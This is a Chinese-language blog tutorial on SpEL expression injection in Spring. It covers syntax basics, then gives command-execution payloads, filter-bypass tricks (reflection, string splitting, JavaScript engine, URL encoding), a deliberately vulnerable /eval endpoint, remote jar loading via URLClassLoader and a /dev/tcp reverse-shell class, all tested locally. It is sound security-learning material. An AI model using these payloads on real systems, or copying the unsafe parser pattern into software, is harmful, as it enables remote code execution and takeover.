---
title: SpEL 表达式注入
date: 2025-11-17T11:00:00+08:00
tags:
  - "SpEL 表达式注入"
categories:
  - "Java"
description: SpEL 表达式注入
showToc: true
draft: false
tocOpen: true
---
# SpEL 表达式注入

# 1、SpEL 基础

## 1.1 简介

在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SpEL），是一种强大的**运行时查询和操作对象图的语言**，语法类似于Jakarta表达语句，但额外支持方法调用和基本字符串模板。SpEL旨在为Spring社区提供一种统一且功能全面的表达式语言，适用于所有Spring产品，并根据这些产品的需要设计了其特性。尽管SpEL是Spring框架的一部分，但它可以独立于Spring使用。通常情况下，用户只需编写简单的表达式字符串即可利用SpEL的功能，无需关心底层架构细节。例如，在基于XML或注解的bean定义中集成SpEL就是一个常见应用。



SpEL 表达式必须使用占位符语法 `#{SpelExpression}`，以便它们可以嵌入到纯文本字符串中（换句话说，SpEL 启用了表达式模板）。

SpEL 还可使用 `@BeanID语法在注册表中查找 Bean` （通常是 Spring 注册表）。例如，使用 ID、`headerUtils` 和方法 `count （）` （计数当前消息中的标头数）指定 bean，可以在 SpEL predicate 中使用 `headerUtils` bean，如下所示：

```plain
#{@headerUtils.count > 4}
```





## 1.2 表达式类型



### 1.2.1 字面值

最简单的 SpEL 表达式就是仅包含一个字面值。

下面我们在 XML 配置文件中使用 SpEL 设置类属性的值为字面值，此时需要用到 `#{}` 定界符，注意若是指定为字符串的话需要添加单引号括起来：

```xml
<property name="message1" value="#{666}"/>
<property name="message1" value="#{aaaa}"/>
```



还可以直接与字符串混用：

```xml
<property name="message1" value="the value is #{666}"/>
```



### 1.2.2 Demo



```java
package com.src.basicspel;

public class HelloWorld {
    private String message;

    public void setMessage(String message) {
        this.message = message;
    }

    public void getMessage() {
        System.out.println("Your Message :" + message);
    }
}
```





```java
package com.src.basicspel;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

@SpringBootApplication
public class BasicSpElApplication {

    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext("Demo.xml");
        HelloWorld helloWorld = context.getBean("helloWorld", HelloWorld.class);
        helloWorld.getMessage();
    }

}
```



```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.springframework.org/schema/beans
  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd ">

  <bean id="helloWorld" class="com.src.basicspel.HelloWorld">
    <property name="message" value="#{'aaa'} is #{3333}" />
  </bean>

</beans>
```





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171207819.png)



参考 Drunkbaby 师傅的文章：

## 1.3 引用 Bean

SpEl 表达式能够通过其他 Bean 的 ID 进行引用，直接在 #{} 符号中写入 ID 名即可，无需添加单引号：

原来的写法：`<constructor-arg ref="test"/>`

在 SpEL 中：`<constructor-arg value="#{test}">`



### 1.3.1 Demo



SpellChecker.java



```java
package com.src.basicspel;

public class SpellChecker {
    public SpellChecker() {
        System.out.println("Inside SpellChecker constructor.");
    }
    public void checkSpelling() {
        System.out.println("Inside checkSpelling.");
    }
}
```



TextEditor.java

```java
package com.src.basicspel;

public class TextEditor {
    private SpellChecker spellChecker;

    public TextEditor(SpellChecker spellChecker) {
        System.out.println("Inside TextEditor constructor." );
        this.spellChecker = spellChecker;
    }

    public void spellCheck() {
        spellChecker.checkSpelling();
    }
}
```



RefSpellAndEditor.java

```java
package com.src.basicspel;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class RefSpellAndEditor {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext("editor.xml");
        TextEditor editor = context.getBean("textEditor", TextEditor.class);
        editor.spellCheck();
    }
}
```



editor.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.springframework.org/schema/beans
  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd ">

  <!-- Definition for spellChecker bean -->
  <bean id="spellChecker" class="com.src.basicspel.SpellChecker" />

  <!-- Definition for textEditor bean -->
  <bean id="textEditor" class="com.src.basicspel.TextEditor">
    <!--<constructor-arg ref="spellChecker"/>-->
    <constructor-arg value="#{spellChecker}"/>
  </bean>

</beans>
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209680.png)



## 1.4  引用类属性

SpEL 表达式能够访问类的属性。

比如， 参赛者 Drunkbaby  是一位模仿高手，Johnford 唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：

```xml
<bean id="kenny" class="com.spring.entity.Instrumentalist"
    p:song="May Rain"
    p:instrument-ref="piano"/>
<bean id="Drunkbaby" class="com.spring.entity.Instrumentalist">
    <property name="instrument" value="#{kenny.instrument}"/>
    <property name="song" value="#{kenny.song}"/>
</bean>
```

key 指定 `kenny<bean>` 的 id
value 指定 `kenny<bean>`的 song 属性。其等价于执行下面的代码：

```java
Instrumentalist carl = new Instrumentalist();
carl.setSong(kenny.getSong());
```



## 1.5  引用类方法

SpEL 表达式还可以访问类的方法。

假设现在有个 `SongSelector` 类，该类有个 `selectSong()` 方法，这样的话 Drunkbaby 就可以不用模仿别人，开始唱 `songSelector` 所选的歌了：

```xml
<property name="song" value="#{SongSelector.selectSong()}"/>
```



carl 有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用 `toUpperCase()` 方法：

```xml
<property name="song" value="#{SongSelector.selectSong().toUpperCase()}"/>
```



注意：这里我们不能确保不抛出 `NullPointerException`，为了避免这个讨厌的问题，我们可以使用 SpEL 的 `null-safe` 存取器：

```xml
<property name="song" value="#{SongSelector.selectSong()?.toUpperCase()}"/>
```

`?.` 符号会确保左边的表达式不会为 `null`，如果为 `null` 的话就不会调用 `toUpperCase()` 方法了。





## 1.6 类类型表达式 T(Type)



在 SpEL 表达式中，使用 `T(Type)` 运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。

使用 `T(Type)` 来表示 `java.lang.Class` 实例，Type 必须是类全限定名，但 `”java.lang”` 包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。

这里就有潜在的攻击面了
因为我们 `java.lang.Runtime` 这个包也是包含于 `java.lang` 的包的，所以如果能调用 `Runtime`就可以进行命令执行

在 XML 配置文件中的使用示例，要调用 `java.lang.Math` 来获取 0~1 的随机数:

```
<property name="random" value="#{T(java.lang.Math).random()}"/>
```



简单来说，**在 SpEL 中， T(Type) 用于 获取一个 Java 类的 Class 对象**，例如：

`T(java.lang.String)`  返回  `java.lang.String.class`。返回 Class 后，就可以调用类的静态方法、获取类的静态字段等等，而 T(Type) **允许任意加载类、调用静态方法**，那么也就可以执行敏感操作，例如：`T(java.lang.Runtime).getRuntime().exec("calc")`，如果上下文没有限制 SpEL 的访问类型，那么意味着：SpEL = 远程命令访问。



### 1.6.1 Demo



修改 Demo.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	   xsi:schemaLocation="http://www.springframework.org/schema/beans
 http://www.springframework.org/schema/beans/spring-beans-3.0.xsd ">

<bean id="helloWorld" class="com.src.basicspel.HelloWorld">
	<property name="message" value="#{'aaa'} is #{T(java.lang.Math).random()}" />
</bean>

</beans>
```





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209529.png)



### 1.6.2 恶意调用并执行命令



修改 Value 中的类类型表达式的类为 Runtime 并调用命令执行方法：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	   xsi:schemaLocation="http://www.springframework.org/schema/beans
 http://www.springframework.org/schema/beans/spring-beans-3.0.xsd ">

<bean id="helloWorld" class="com.src.basicspel.HelloWorld">
	<property name="message" value="#{'aaa'} is #{T(java.lang.Runtime).getRuntime.exec('calc')}" />
</bean>

</beans>
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209602.png)



# 2、SpEL 用法

SpEL 的用法有三种形式，一种是在注解 `@Value` 中；一种是 XML 配置；最后一种是在代码块中使用 Expression。

## 2.1  XML 配置

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	   xsi:schemaLocation="http://www.springframework.org/schema/beans
 http://www.springframework.org/schema/beans/spring-beans-3.0.xsd ">

<bean id="helloWorld" class="com.src.basicspel.HelloWorld">
	<property name="message" value="#{'aaa'} is #{T(java.lang.Runtime).getRuntime.exec('calc')}" />
</bean>

</beans>
```



## 2.2 注解 `@Value`

这种形式的值一般是写在 properties 的配置文件中的。

```java
public class EmailSender {
    @Value("${spring.mail.username}")
    private String mailUsername;
    @Value("#{ systemProperties['user.region'] }")    
    private String defaultLocale;
    //...
}
```



## 2.3 Expression 用法



```java
//创建解析器
ExpressionParser parser = new SpelExpressionParser();
//解析表达式
Expression expression = parser.parseExpression("('Hello' + ' Drunkbaby').concat(#end)");
//构造上下文
EvaluationContext context = new StandardEvaluationContext();
//求值
context.setVariable("end", "!");  
System.out.println(expression.getValue(context));
```

具体步骤如下：

1、创建解析器：SpEL 使用 `ExpressionParser` 接口表示解析器，提供 `SpelExpressionParser` 默认实现；
2、解析表达式：使用 `ExpressionParser` 的 `parseExpression` 来解析相应的表达式为 `Expression` 对象；
3、构造上下文：准备比如变量定义等等表达式需要的上下文数据；
4、求值：通过 `Expression` 接口的 `getValue` 方法根据上下文获得表达式值；



**主要接口：**

- **ExpressionParser 接口**：表示解析器，默认实现是 `org.springframework.expression.spel.standard` 包中的 `SpelExpressionParser` 类，使用 `parseExpression` 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；
- **EvaluationContext 接口**：表示上下文环境，默认实现是 `org.springframework.expression.spel.support` 包中的 `StandardEvaluationContext` 类，使用 `setRootObject` 方法来设置根对象，使用 `setVariable` 方法来注册自定义变量，使用 `registerFunction` 来注册自定义函数等等。
- **Expression 接口**：表示表达式对象，默认实现是 `org.springframework.expression.spel.standard` 包中的 `SpelExpression`，提供 `getValue` 方法用于获取表达式值，提供 `setValue` 方法用于设置对象值。





### 2.3.1 Demo

程序会将这里传入 `parseExpression()` 函数的字符串参数 spel  作为 SpEL 表达式来解析，而无需通过 `#{}` 符号来注明



```java
package com.src.basicspel;

import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class ExpressionCalc {
    public static void main(String[] args){

        String spel = "T(Runtime).getRuntime().exec(\"calc\")";
        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();
        Expression expression = spelExpressionParser.parseExpression(spel);
        System.out.println(expression.getValue());

    }
}
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210056.png)







### 2.3.2 类实例化

类实例化同样使用 Java 关键字 new，类名必须是全限定名，但 `java.lang` 包内的类型除外。

```java
package com.src.basicspel;

import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class newClass {
    public static void main(String[] args) {
        String spel = "new java.util.Date()";
        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();
        Expression expression = spelExpressionParser.parseExpression(spel);
        System.out.println(expression.getValue());

    }
}
```





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210814.png)	

# 3、SpEL 表达式注入漏洞

## 3.1 漏洞原理

`SimpleEvaluationContext` 和 `StandardEvaluationContext` 是 SpEL 提供的两个 `EvaluationContext`：

- SimpleEvaluationContext : 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。
- StandardEvaluationContext : 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

`SimpleEvaluationContext` 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 `StandardEvaluationContext` 是支持全部 SpEL 语法的。

由前面的 类类型表达式 知道，SpEL 表达式是可以操作类及其方法的，可以通过类类型表达式 `T(Type)` 来调用任意类方法。这是因为在不指定 `EvaluationContext` 的情况下默认采用的是 `StandardEvaluationContext`，而它包含了 SpEL 的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。



例如 2.3 中的 Demo ：

```java
package com.src.basicspel;

import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class ExpressionCalc {
    public static void main(String[] args){

        String spel = "T(Runtime).getRuntime().exec(\"calc\")";
        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();
        Expression expression = spelExpressionParser.parseExpression(spel);
        System.out.println(expression.getValue());

    }
}
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210366.png)





## 3.2 通过反射的方式进行 SpEL 注入

```java
public class ReflectBypass {
    public static void main(String[] args) {
        String spel = "T(String).getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc\")";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
```



## 3.3 基础 Poc



除了常见的 `Runtime` 的命令执行方法，还有`ProcessBuilder`进行命令执行

```java
// Runtime
T(java.lang.Runtime).getRuntime().exec("calc")
T(Runtime).getRuntime().exec("calc")

// ProcessBuilder
new java.lang.ProcessBuilder({'calc'}).start()
new ProcessBuilder({'calc'}).start()
```





## 3.4 基础 Bypass 

### 3.4.1  常见的 Bypass 技巧

```java
 // 反射调用
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
 
// 同上，需要有上下文环境
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
 
// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
 
// 同上，需要有上下文环境
#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
 
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
// byte数组内容的生成后面有脚本
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
 
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
// byte数组内容的生成后面有脚本
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
```



### 3.4.2 JavaScript Engine Bypass

使用 JS 引擎进行绕过



获取所有 JS 引擎信息

```java
package com.src.JSBypass;

import javax.script.ScriptEngineFactory;
import javax.script.ScriptEngineManager;
import java.util.List;

public class demo1 {
    public static void main(String[] args) {
        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
        List<ScriptEngineFactory> factories = scriptEngineManager.getEngineFactories();
        for (ScriptEngineFactory factory : factories) {
            System.out.printf(
                    "Name: %s%n" + "Version: %s%n" + "Language name: %s%n" +
                            "Language version: %s%n" +
                            "Extensions: %s%n" +
                            "Mime types: %s%n" +
                            "Names: %s%n",
                    factory.getEngineName(),
                    factory.getEngineVersion(),
                    factory.getLanguageName(),
                    factory.getLanguageVersion(),
                    factory.getExtensions(),
                    factory.getMimeTypes(),
                    factory.getNames()
            );
        }
    }
}
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210329.png)



通过结果中的 Names，我们知道了所有的 js 引擎名称故 `getEngineByName` 的参数可以填 `[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]`,举个例子:

```java
ScriptEngineManager sem = new ScriptEngineManager();
ScriptEngine engine = sem.getEngineByName("nashorn");
System.out.println(engine.eval("2+1"));
```



payload:

```java
// JavaScript引擎通用PoC
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")
  
// JavaScript引擎+反射调用
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)
 
// JavaScript引擎+URL编码
// 其中URL编码内容为：
// 不加最后的getInputStream()也行，因为弹计算器不需要回显
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)
```



```java
package com.src.JSBypass;

import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class test1 {
    public static void main(String[] args) {
        //String spel = "T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la\"+\"ng.Run\"+\"time.getRu\"+\"ntime().ex\"+\"ec(s);\")\n";

        //String spel = "T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"cmd\",\"/C\",\"calc\"})),)\n";

        String spel = "T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(java.net.URLDecoder).decode(\"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\")),)";
        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();
        Expression expression = spelExpressionParser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210399.png)





## 3.5  通过类加载器构造 PoC & Bypass

### 3.5.1 UrlClassloader

这个方法就是通过远程类加载



#### Windons:

目标：现在有一个 Spring Boot 服务，它的 `/eval?exp=` 路径下可以进行 SpEL 表达式注入，我们要通过注入构造 `URLClassLoader` 来远程加载类 `http://127.0.0.1:8999/Exp.jar` 达到执行恶意类的目的





1） 首先构造一个恶意类

弹出计算器

```java
public class Exp {
    public Exp(String p) {
        try {
            Runtime.getRuntime().exec("cmd /c start calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```



2） 编译打包为 Exp.jar

```
javac Exp.java
jar cvf Exp.jar Exp.class
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210485.png)



3） 用 python 本地启动 http  服务

```
python -m http.server 8999
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210385.png)

 4） 准备 Spring Boot SpEL 漏洞 Demo  



```java
package com.example.demo.urlClassloader;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class DemoApplication {
    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }
}
package com.example.demo.urlClassloader;

import org.springframework.expression.*;
import org.springframework.expression.spel.standard.*;
import org.springframework.web.bind.annotation.*;

@RestController
public class EvalController {

    @GetMapping("/eval")
    public String eval(@RequestParam String exp) {
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(exp);
        Object result = expression.getValue();
        return String.valueOf(result);
    }
}
<project xmlns="http://maven.apache.org/POM/4.0.0"
		 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
		 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
         https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	
	<groupId>com.test</groupId>
	<artifactId>demo</artifactId>
	<version>1.0</version>
	<packaging>jar</packaging>
	
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.3.12.RELEASE</version>
	</parent>
	
	<dependencies>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>
	</dependencies>

</project>
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210844.png)





5）做完准备工作，我们就可以构造 payload 进行测试了

原始 payload：

```java
new java.net.URLClassLoader(
    new java.net.URL[]{new java.net.URL("http://127.0.0.1:8999/Exp.jar")}
    ).loadClass("Exp").getConstructors()[0].newInstance("aaa")
```

如果直接注入：

内容就会被 Tomcat 拦截， 从 **Tomcat 8.5+ / 9+** 开始， `{ } [ ] ( ) " . ` 这些字符如果未编码 **会直接被拒绝**。  

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210844.png)



对 payload 进行 URL 编码：

```java
new%20java.net.URLClassLoader(
%20%20%20%20new%20java.net.URL%5B%5D%7Bnew%20java.net.URL(%22http%3A%2F%2F127.0.0.1%3A8999%2FExp.jar%22)%7D
%20%20%20%20).loadClass(%22Exp%22).getConstructors()%5B0%5D.newInstance(%22aaa%22)
```



编码之后再进行注入，就可以弹出计算器了

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211140.png)

#### Linux:

1） 先准备恶意类并编译

```java
import java.io.IOException;

public class Exp{
    public Exp(String address){
        address = address.replace(":","/");
        try {
            ProcessBuilder p = new ProcessBuilder(
                    "/bin/bash","-c",
                    "exec 5<>/dev/tcp/" + address + "; cat <&5 | while read line; do $line 2>&5 >&5; done"
        );
            p.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171736764.png)



2）借用 Windows 中写好的 SpringBoot 项目启动漏洞 Demo

```
java -jar demo-1.0.jar
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211770.png)



3）启动本地 http 服务

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211478.png)



4）nc 监听 2333 端口

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211117.png)



5）传入恶意 payload

```
curl -G "http://127.0.0.1:8876/eval" --data-urlencode 'exp=T(java.net.URLClassLoader).newInstance(new java.net.URL[]{new java.net.URL("http://127.0.0.1:8999/Exp.jar")}).loadClass("Exp").getConstructors()[0].newInstance("127.0.0.1:2333")'
```



6）

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211346.png)





connect to [127.0.0.1] from localhost [127.0.0.1] 48096

- 有一个进程从 **本地（localhost）**
- 使用随机端口 **48096**
- 连接到了监听端口 **2333**

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211129.png)



如图，nc 已经获取到反弹 shell

可以执行命令

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211129.png)



### 3.5.2 AppClassLoader

 利用 SpEL，直接用 AppClassLoader 加载本地已经存在的 class，并调用里面的代码。无需远程 URL



首先 `T(java.lang.ClassLoader)`获取 `ClassLoader` 类这个 Class 对象

`T(java.lang.ClassLoader).getSystemClassLoader()`获取系统类加载器，即 `AppClassLoader`，接着加载`AppClassLoader`中的一个类`loadClass('java.lang.Runtime')`，调用`getRuntime()`执行命令`exec('calc')`。



`AppClassLoader`和`URLClassLoader`的区别在于`AppClassLoader`加载的是本机 classpath 的类，本地攻击无需远程 URL；`URLClassLoader`可以加载任意 URL 的类，用于远程加载恶意类。



```java
package com.src.addClassLoader;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;

public class demo1 {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {
        String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";
        //创建解析器    
        ExpressionParser parser = new SpelExpressionParser();
        //解析表达式
        Expression exp = parser.parseExpression(cmdStr);
        //弹出计算器
        System.out.println(exp.getValue());
    }
}
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211750.png)











# 参考：

SpEL（Spring表达语言）表达式详述：

[https://javacfox.github.io/2019/07/04/SpEL%EF%BC%88Spring%E8%A1%A8%E8%BE%BE%E8%AF%AD%E8%A8%80%EF%BC%89%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%A6%E8%BF%B0/](https://javacfox.github.io/2019/07/04/SpEL（Spring表达语言）表达式详述/)

SpEL表达式：

[https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html](https://mrbird.cc/SpEL表达式.html)





[https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#%E9%80%9A%E8%BF%87-ClassLoader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9E%84%E9%80%A0-PoC-amp-Bypass](https://drun1baby.top/2022/09/23/Java-之-SpEL-表达式注入/#通过-ClassLoader-类加载器构造-PoC-amp-Bypass)





[http://101.36.122.13:4000/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#H1gIO](http://101.36.122.13:4000/2025/03/25/SPEL表达式注入/#H1gIO)